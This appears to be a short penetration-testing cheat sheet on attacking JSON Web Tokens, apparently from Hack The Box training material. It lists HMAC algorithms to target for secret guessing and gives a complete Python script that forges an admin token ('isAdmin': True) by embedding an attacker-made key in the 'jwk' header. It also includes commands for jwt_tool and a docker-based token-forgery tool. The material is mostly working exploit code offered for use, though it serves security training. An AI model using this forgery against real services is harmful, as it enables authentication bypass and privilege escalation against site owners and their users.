# JWT
## Guessing secrets algs
- HS256
- HS384
- HS512

## Exploiting jwk
1. Generate keys for sign JWT
```bash
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```
2. Manipulate JWT
```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```
3. Install dependencies/run code
```bash
pip3 install pyjwt cryptography python-jose
python3 exploit.py 
```

## [jwt_tool](https://github.com/ticarpi/jwt_tool)
### Installation
```bash
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt
```

## Crack JWT with docker
```bash
docker run -it --rm sig2n /bin/bash
python3 jwt_forgery.py <jwt1> <jwt2>
